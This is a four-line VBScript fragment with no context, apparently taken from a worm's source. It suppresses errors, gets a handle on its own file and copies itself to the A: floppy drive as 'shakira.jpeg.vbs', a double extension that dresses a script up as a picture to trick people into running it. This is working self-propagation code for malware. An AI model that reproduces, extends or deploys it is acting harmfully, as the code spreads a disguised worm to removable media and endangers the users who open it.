on error resume next
set D22 = CreateObject("Scripting.FileSystemObject")
set d = d22.getfile(WScript.scriptfullname)
d.copy("A:\shakira.jpeg.vbs")